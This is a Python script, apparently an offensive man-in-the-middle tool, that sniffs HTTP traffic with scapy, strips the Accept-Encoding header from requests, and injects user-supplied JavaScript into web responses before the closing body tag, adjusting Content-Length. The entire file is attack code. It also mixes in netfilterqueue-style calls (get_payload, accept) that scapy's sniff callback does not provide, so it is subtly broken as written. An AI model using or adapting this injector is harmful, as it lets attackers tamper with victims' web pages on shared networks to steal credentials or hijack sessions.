from scapy.all import IP, TCP, Raw, send, sniff
from colorama import init, Fore
import re

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RESET = Fore.RESET
added_text = input("Enter the JavaScript you'd like to inject: ")

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the Scapy packet
    spacket = IP(packet.get_payload())
    
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded, apparently not HTML
                # forward the packet and exit the function
                send(spacket)
                return
            # remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # send the modified packet
            send(spacket, verbose=0)
        
        if spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except:
                send(spacket)
                return
            # calculate the length in bytes, each character corresponds to a byte
            added_text_length = len(added_text)
            # replace the </body> tag with the added text plus </body>
            load = load.replace("</body>", added_text + "</body>")
            
            if "Content-Length" in load:
                # if Content-Length header is available
                # get the old Content-Length value
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                # re-calculate the content length by adding the length of the injected code
                new_content_length = content_length + added_text_length
                # replace the new content length in the header
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                # print a message if injected
                if added_text in load:
                    print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
            
            # set the new data
            spacket[Raw].load = load
            # send the modified packet
            send(spacket, verbose=0)

    # accept all the packets
    packet.accept()


if __name__ == "__main__":
    # sniff packets and process them
    sniff(filter="tcp port 80", prn=process_packet)
